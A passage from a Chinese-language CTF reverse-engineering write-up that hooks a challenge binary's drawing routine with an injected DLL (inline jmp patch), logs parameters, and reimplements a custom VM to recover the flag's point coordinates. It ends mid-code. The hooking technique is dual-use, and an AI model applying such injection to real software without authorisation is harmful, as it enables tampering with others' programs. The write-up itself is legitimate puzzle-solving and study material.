shellcode(%d,%d,%d,%d,%d,%p,%p,%p,%p,%p)\n"</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          <br /><br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                      DWORD  ul_reason_for_call,<br />                      LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />            AllocConsole();<br />            freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />            HookShellcode();<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />        <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>首先是为了输出方便创建一个终端定向标准输出，然后 IO 函数就能往终端打印了。</p><p>hook 其实就是覆盖函数头，劫持到自己的函数里面，打印出参数之后把钩子去掉，恢复回原来的样子，再去正常调用，调用结束之后重新挂回钩子，要实现输出前100条的话最后不要重新挂钩子就行。</p><p>结果（PS：输出是正常的，但是我强制都改成黄色绘制了）：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=13065c5b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlibnPVtt0OkukUw48ouSicxUPyGAZ8EymbErGOCdseqia94n5WnfUXO5SQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>因为前几个参数是 <code style="font-family: SFMono-Regular, Consolas, ;">__int32</code> 类型的，所以直接换 <code style="font-family: SFMono-Regular, Consolas, ;">%d</code> 打印一下，这里放一下部分的数据：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">shellcode </span><span style="color: rgb(150, 203, 254);">addr=000001C5654B0000<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,50,-14703700,1248208,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,-390,1822057,-1524539,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,170,-7425437,14227863,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,230,1897472,15215384,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-950,-210,3743658,7267794,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(50,350,966258,14122466,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-890,-270,463184,7666472,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(170,-270,-2474473,12856971,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-770,230,3460907,-13492529,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(110,-390,-5989351,14280177,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(-830,170,-3514649,12856715,ffffff00,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(650,50,15384343,11002795,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(590,110,12856715,13307703,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(530,170,14096303,2054931,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(470,230,12869865,15314261,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(410,290,13085065,12188981,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(470,290,11235584,6581496,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(530,290,12847529,3263901,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(710,50,14122635,3090291,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(770,50,14265601,10052917,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(830,50,3793238,14305830,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(710,110,1253500,3434568,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)<br /></span>call <span style="color: rgb(150, 203, 254);">shellcode(770,170,13177867,745383,ff2ddbe7,000001C56640AC28,000001C5701C78B0,000001C5665CA4D8,000001C5704025C8,000001C570402D88)</span></code></pre><p>可以发现，前两个参数应该是坐标（我猜的），但是出现了负值，也就是打印到了屏幕外面，而且都是黄色的点会出现这种情况，导致了 <code style="font-family: SFMono-Regular, Consolas, ;">FLAG</code> 打印不出来，因此尝试在 hook 层面修复这个 bug，把所有的负值翻转，但是发现并没什么用，说明bug应该不止那么简单，还得再分析分析。</p><p>首先就是想看看它一轮有多少个点，直接建个 <code style="font-family: SFMono-Regular, Consolas, ;">set</code> 去输出就行，把所有点保存下来。</p><p>DLL代码：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br />std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x,%p,%p,%p,%p,%p)\n"</span>,x, y, a3, a4, a5, a6, a7, a8, a9, a10);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}<br /></code></pre><p>输出：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">(-950,-210)<br />(-950,50)<br />(-950,170)<br />(-890,-270)<br />(-830,170)<br />(-770,230)<br />(50,-390)<br />(50,230)<br />(50,350)<br />(110,-390)<br />(170,-270)<br />(410,290)<br />(470,230)<br />(470,290)<br />(530,170)<br />(530,290)<br />(590,110)<br />(650,50)<br />(710,50)<br />(710,110)<br />(770,50)<br />(770,170)<br />(830,50)<br />(830,230)<br />(890,290)<br />(950,50)<br />(950,290)<br />(1010,50)<br />(1010,110)<br />(1010,290)<br />(1070,50)<br />(1070,170)<br />(1070,290)<br />(1130,50)<br />(1130,170)<br />(1130,230)<br />(1190,170)<br />(1190,290)<br />(1250,170)<br />(1250,290)<br />(1310,290)<br />(1370,290)</code></pre><p>一共是 42 个点，而数了一下它题目给的正确的点数刚好也是42个，黄点是有 11 个， 蓝点有 31 个。</p><p>但是稍微改了一下第一个第二个参数发现点会直接消失，看样子是跟第三个第四个参数会有关系。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c9c65e63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRllsxllOlvbpHYo7ycY6u6LY3PPmJFjMfBYIibvkCRiczUAIGYwlLl1bxw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>通过左右参数的比对观察一下，正确调用时的这些局部变量分别是多少，看看能不能找到点关系（放弃）。</p><p>还是选择自己写一个虚拟机去跑。</p><p>代码太长了不放了，可以自己去 dump，我写一下我自己的虚拟机调试流程：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">int</span> code[<span style="color: rgb(255, 115, 253);">1855</span>];     <span style="color: rgb(124, 124, 124);">//...</span><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(255, 255, 182);">int</span> RIP=<span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> reg;<br />    <span style="color: rgb(255, 255, 182);">int</span> Stack[<span style="color: rgb(255, 115, 253);">50</span>];<br />    <span style="color: rgb(255, 255, 182);">int</span> v13,v14;<br />    printf(<span style="color: rgb(168, 255, 96);">"start\n"</span>);<br />    memset(Stack,<span style="color: rgb(255, 115, 253);">0</span>,sizeof(Stack));<br />    Stack[<span style="color: rgb(255, 115, 253);">8</span>]=Stack[<span style="color: rgb(255, 115, 253);">9</span>]=<span style="color: rgb(255, 115, 253);">50</span>;<span style="color: rgb(124, 124, 124);">//截图中忘了这一句，不要忘了加上</span><br />    <span style="color: rgb(150, 203, 254);">while</span>(RIP&lt;=<span style="color: rgb(255, 115, 253);">0x1301</span>){<br />        <span style="color: rgb(124, 124, 124);">//printf("execute opcode=%d RIP=%d\n",code[RIP],RIP);</span><br />        <span style="color: rgb(255, 255, 182);">int</span> opcode=code[RIP];<br />        RIP++;<br />        <span style="color: rgb(150, 203, 254);">switch</span> (opcode) {<br /><br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0</span>:<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]+=Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                printf(<span style="color: rgb(168, 255, 96);">"stack[0]=%d+%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">1</span>:<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]-=Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                printf(<span style="color: rgb(168, 255, 96);">"stack[0]=%d-%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">2</span>:<br />                Stack[code[RIP+<span style="color: rgb(255, 115, 253);">1</span>]]=Stack[code[RIP]];<br />                printf(<span style="color: rgb(168, 255, 96);">"Stack[%d]=Stack[%d]=%d\n"</span>,code[RIP+<span style="color: rgb(255, 115, 253);">1</span>],code[RIP],Stack[code[RIP]]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">2</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">3</span>:<br />                Stack[code[RIP+<span style="color: rgb(255, 115, 253);">1</span>]]=code[RIP];<br />                printf(<span style="color: rgb(168, 255, 96);">"Stack[%d]=%d\n"</span>,code[RIP+<span style="color: rgb(255, 115, 253);">1</span>],code[RIP]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">2</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>; <br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">4</span>:<br />                v13=Stack[<span style="color: rgb(255, 115, 253);">0</span>];<br />                v14=Stack[<span style="color: rgb(255, 115, 253);">0</span>]*(Stack[<span style="color: rgb(255, 115, 253);">1</span>]+<span style="color: rgb(255, 115, 253);">1</span>);<br />                printf(<span style="color: rgb(168, 255, 96);">"Origin: Stack[0]=%d Stack[1]=%d "</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                Stack[<span style="color: rgb(255, 115, 253);">0</span>]=code[RIP]^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />                Stack[<span style="color: rgb(255, 115, 253);">1</span>]=((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v13)) % <span style="color: rgb(255, 115, 253);">256</span>+ (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (v13 * Stack[<span style="color: rgb(255, 115, 253);">1</span>])) % <span style="color: rgb(255, 115, 253);">256</span> + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />                printf(<span style="color: rgb(168, 255, 96);">"Target: Stack[0]=%d Stack[1]=%d\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">0</span>],Stack[<span style="color: rgb(255, 115, 253);">1</span>]);<br />                RIP+=<span style="color: rgb(255, 115, 253);">1</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">5</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"paint(%d,%d,%d,%d,0xFFFFFF00);\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>],Stack[<span style="color: rgb(255, 115, 253);">5</span>],Stack[<span style="color: rgb(255, 115, 253);">6</span>],Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">6</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"paint(%d,%d,%d,%d,0xFF2DDBE7);\n"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>],Stack[<span style="color: rgb(255, 115, 253);">5</span>],Stack[<span style="color: rgb(255, 115, 253);">6</span>],Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">7</span>:<br />                printf(<span style="color: rgb(168, 255, 96);">"exit\n"</span>);<br />                exit(<span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(150, 203, 254);">default</span>:<br />                exit(<span style="color: rgb(255, 115, 253);">0</span>);<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br /><br />        }<br />    }<br />}</code></pre><p>运行之后发现了一点：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f97abe27&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlYILQVgfZ3N0KbagvkZswWAMwb166nAL7mjBzvUb6ZuSHHrUlOvD1Xw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>第三个和第四个参数分别为用 <code style="font-family: SFMono-Regular, Consolas, ;">opcode==4</code> 时候的 x 和 y 的坐标运算得到的值。</p><p>试试看利用 opcode=4 的流程能否让程序任意位置输出色块。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">v13=x<span style="color: rgb(124, 124, 124);">;</span><br />v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>)<span style="color: rgb(124, 124, 124);">;</span><br />a3=operand^<span style="color: rgb(255, 115, 253);">0</span>x414345<span style="color: rgb(124, 124, 124);">;</span><br />a4=((x ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span>+ (((x ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((x ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>))<span style="color: rgb(124, 124, 124);">;</span></code></pre><p>因为每次的这个操作数都不同，这里选取第一个错误坐标 <code style="font-family: SFMono-Regular, Consolas, ;">-950 50</code> 来绘制，利用这里的逻辑去做。</p><p>DLL代码：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br 